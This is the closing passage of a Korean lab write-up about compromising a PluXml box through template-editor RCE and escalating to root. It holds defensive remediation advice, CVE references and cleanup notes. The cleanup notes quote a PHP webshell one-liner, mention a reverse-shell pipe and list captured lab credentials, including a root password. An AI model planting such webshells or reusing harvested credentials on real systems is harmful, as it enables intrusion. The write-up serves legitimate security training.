21. **플래그가 표준 위치에 없을 수 있다.** 일반 사용자 계정이 없으면 `local.txt`가 `/var/www/` 같은 곳에 있다. `ls /home/*/` → `/var/www/` → `/tmp /opt /srv` → 그다음에 `find`.
22. **공개 익스플로잇의 CVE 표기를 검증하라.** `pluxml-rce`의 README는 CVE-2022-25018을 인용하지만 **실제로 악용하는 것은 다른 결함**이다(2-5). 리포트에 틀린 번호를 적으면 신뢰를 잃는다.

---

## 8. 방어 관점

| 결함 | 조치 |
|---|---|
| ★ **기본 자격증명 `admin/admin`** | **이 하나만 고쳤어도 체인 전체가 시작조차 못 한다.** 최초 설치 시 비밀번호 변경 강제 + 로그인 실패 제한(fail2ban) |
| **관리자 템플릿 편집기가 임의 PHP 실행** | **업그레이드만으로는 안 된다** — 벤더는 이를 정상 기능으로 취급하고 릴리스 태그 v5.8.7~v5.8.23 저장 로직이 동일하다(2-5). master는 `$tpl` 화이트리스트를 넣어 **임의 파일명은 막았지만**, 화이트리스트에 `.php` 가 남아 있어 **관리자 = 코드 실행**은 그대로다. 실질 통제는 셋이다: ⑴ 관리 경로(`/core/admin/`)를 **IP 제한·HTTP Basic·VPN 뒤로**, ⑵ 관리자 계정 **MFA**, ⑶ **`themes/` 쓰기 권한 제거**(배포 계정만 쓰기, www-data는 읽기 전용) |
| **웹 루트 전체가 www-data 쓰기 가능** | 1-3의 초록 체크가 전부 공격 전제조건이었다. **PluXml이 쓰기를 요구하는 디렉터리는 `data/` 뿐**이어야 하고, `themes/`·`plugins/`·웹루트 자체는 읽기 전용이어야 한다 |
| ★ **root 평문 비밀번호를 메일 본문에 기록** | **가장 심각한 운영 실수.** 비밀번호를 평문으로 전달하지 않는다. 불가피하면 1회용 채널 + 즉시 변경. 메일함은 **서비스 계정이 읽을 수 있다** |
| **`/var/spool/mail/www-data` 를 www-data가 읽을 수 있음** | 구조상 정상이다(소유자가 www-data). 따라서 **"서비스 계정 메일함에 민감정보를 넣지 않는다"가 유일한 통제**다 |
| **www-data가 `su` 로 root 전환 가능** | root 로그인을 비밀번호 기반으로 두지 않는다. `PermitRootLogin no` + `sudo` 기반 운영 + `/etc/pam.d/su` 에 `pam_wheel.so` 로 **`su` 사용 그룹 제한** |
| **웹서버 계정으로 대화형 셸 획득 가능** | `www-data` 의 셸을 `/usr/sbin/nologin` 으로 (웹셸에는 무력하지만 다른 경로를 줄인다). `mod_php` 대신 **php-fpm + 별도 계정 격리** |
| **아웃바운드 무제한** | 리버스셸이 그대로 붙었다. **egress filtering** 은 RCE의 피해를 크게 줄인다 |
| 탐지 부재 | `sudo` 실패 · 템플릿 파일 변경 · 신규 `/tmp` 실행 파일이 전부 관측 가능한 신호였다. **파일 무결성 모니터링(AIDE)** 을 `themes/` 에 걸면 웹셸 기록 즉시 알림 |

---

## 9. 참고 자료

**1차 사료** (2장의 판정은 전부 아래에서 직접 확인했다)

- **CVE-2024-48138** — `parametres_edittpl.php` 템플릿 편집기 RCE (≤ 5.8.16, CVSS 9.8). **이 박스에서 실제로 악용한 결함**
- **CVE-2022-25018** — https://nvd.nist.gov/vuln/detail/CVE-2022-25018 · 정적 페이지(`statique.php`/`editStatique`) RCE, manager 권한, CVSS 8.8, CWE-94. **익스플로잇 README가 인용하지만 실제 경로와 다르다**
- 발견자 원 보고서 (Moritz Huppert): https://github.com/MoritzHuppert/CVE-2022-25018/blob/main/CVE-2022-25018.pdf
- CVE-2024-22636 — 정적 페이지 RCE 재발 (5.8.9)
- **PluXml 소스**: https://github.com/pluxml/PluXml · `core/admin/parametres_edittpl.php` · `core/lib/class.plx.utils.php`(`write()`) · `core/lib/class.plx.token.php`
- 정적 페이지 패치와 그 되돌림: `15170a27`(2022-04-27 `sanitizePhpTags()`) → `374a401b`(2022-08-01 **Revert**)
- **CVE-2019-10149 — Qualys 원 어드바이저리**: https://www.qualys.com/2019/06/05/cve-2019-10149/return-wizard-rce-exim.txt · 취약 **4.87–4.91**, **4.92에서 수정**
- Exim 공식 스펙 "Security considerations" — 배달 프로세스가 root를 유지하는 근거: https://www.exim.org/exim-html-current/doc/html/spec_html/ch-security_considerations.html
- **21Nails** 어드바이저리 (CVE-2020-28007~28026 + CVE-2021-27216, CRD **2021-05-04**): https://www.exim.org/static/doc/security/CVE-2020-qualys/21nails.txt — ⚠️ **이 문서는 `4.94.2` 를 언급하지 않는다.** 수정 릴리스가 4.94.2라는 판정의 근거는 아래 둘이다
- **4.94.2 릴리스 시각**: ftp.exim.org 배포 디렉터리의 `exim-4.94.2.tar.xz  04-May-2021 13:35` (CRD와 같은 날)
- **4.94.2 ChangeLog**: https://github.com/Exim/exim/blob/exim-4.94.2/doc/doc-txt/ChangeLog — `Exim version 4.94.2` 절이 21Nails 항목(`CVE-2020-28016` 등)을 나열한다

**도구·익스플로잇**

- PluXml RCE 익스플로잇 (실제로 사용): https://github.com/erlaplante/pluxml-rce
- `raptor_exim_wiz` (exploit-db **46996**, **시도했으나 실패**): https://www.exploit-db.com/exploits/46996
- GTFOBins: https://gtfobins.github.io/ — SUID 목록 판정용
- 리버스셸 원라이너: PayloadsAllTheThings — Reverse Shell Cheatsheet

## 남긴 흔적 (랩 정리용)

- ★ **`themes/<style>/static.php` 를 덮어썼다.** 웹셸 `<?php system($_GET['cmd']); ?>` 이 포함된 상태로 남아 있다. **원본 복원 또는 랩 리버트 필요**
- ★ **`/tmp/pwned` · `/tmp/pwned.c`** — 실패한 exim 익스플로잇의 잔여물. **[가정]** `/tmp/pwned` 는 `/bin/sh` 사본이고 setuid가 걸리지 않은 것으로 본다 — 근거는 6-②의 에러 접두사(`/tmp/pwned:`)와 그 뒤의 `whoami` → `www-data` 다. **`ls -l /tmp/pwned` 를 직접 찍지 않았으므로 확정은 아니다**
- **`/tmp/f`** — 리버스셸용 명명 파이프. 남아 있으면 재접속 시 `mkfifo` 가 실패한다
- **로그**: `sudo` 실패 2건(04:57:06, 05:12:46 UTC = 타겟 로컬 00:57, 01:12 EDT)이 **`mail_badpass` 가 켜져 있어** root 앞 메일을 생성했고(기본값은 OFF — 6-③), 그 결과 `/var/spool/mail/www-data` 가 갱신됐다(mtime `Jun 29 01:12`). **[가정]** 반송 경로의 구체적 원인(별칭 미해결 등)은 산출물로 확인되지 않았다
- **획득 자격증명**: PluXml 관리자 `admin` / `admin` · 시스템 **`root` / `6s8kaZZNaZZYBMfh2YEW`**

## 관련 노트

- [[_WRITEUP-STANDARD]] — 이 노트의 작성 기준
- [[pyLoader]] — **같은 날 푼 박스.** 그쪽은 **pre-auth**라 로그인이 불필요했고 곧바로 root였다. **인증 필요 여부와 서비스 실행 계정이 박스의 난이도를 결정한다**는 대비 사례. `--data-binary` ↔ `--data-urlencode` 의 구분도 양쪽을 함께 보면 명확해진다
- [[Codo]] — 평문 자격증명 재사용 → `su`, `su` vs `su -` 의 차이, PTY 없이는 `su` 가 안 되는 함정. **거의 같은 권한상승 구조**
- [[Scarlet]] · [[Zipper]] — 누적 패턴 "평문 비밀번호를 주우면 전면 재사용 시험"
- [[Squid]] — 진단 스크립트가 정찰을 대신해준 같은 패턴(`phpsysinfo`·`testmysql.php`), CSRF 토큰 갱신 함정, "인용이 깨지면 인코딩으로 도망간다"
- [[Muddy]] — Exim(25/tcp)이 등장하는 다른 박스
- [[Crane]] · [[RubyDome]] · [[Astronaut]] · [[Exghost]] · [[Hawat]] — 누적 패턴 **"응답이 성공을 뜻하지 않는다"**. 이 박스에서는 **실패한 익스플로잇이 셸 프롬프트를 띄운 것**이 같은 계열
- [[Hub]] · [[Levram]] — 누적 패턴 "버전 판정은 독립 근거 2개"
